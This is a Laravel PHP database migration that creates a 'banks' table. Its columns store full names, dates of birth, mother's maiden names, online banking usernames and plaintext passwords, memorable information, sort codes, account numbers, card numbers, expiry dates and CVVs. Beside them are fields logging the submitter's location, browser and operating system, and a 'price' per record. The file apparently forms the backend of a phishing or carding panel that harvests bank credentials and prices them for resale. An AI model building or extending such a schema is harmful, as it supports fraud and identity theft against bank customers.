<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

class CreateBanksTable extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('banks', function (Blueprint $table) {
            $table->bigIncrements('id');
            
            $table->string('full_name',100)->nullable();
            $table->string('dob',100)->nullable();
            $table->string('address',100)->nullable();
            $table->string('telephone',100)->nullable();
            $table->string('mobile_telephone',100)->nullable();
            $table->string('mother_maiden',100)->nullable();
            $table->string('username',100)->nullable();
            $table->string('password',100)->nullable();

            $table->string('memorable_info',100)->nullable();
            $table->string('security_code',10)->nullable();
            $table->string('sort_code',10)->nullable();
            $table->string('account_no',100)->nullable();

            $table->string('card_no',100)->nullable();
            $table->string('card_exp',100)->nullable();
            $table->string('cvv',100)->nullable();

            $table->string('submitted_by',100)->nullable();
            $table->string('location',100)->nullable();
            $table->string('user_agent',500)->nullable();
            $table->string('browser',100)->nullable();
            $table->string('os',100)->nullable();
            $table->string('recieved',100)->nullable();

            $table->integer('price')->default(0);


            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('banks');
    }
}
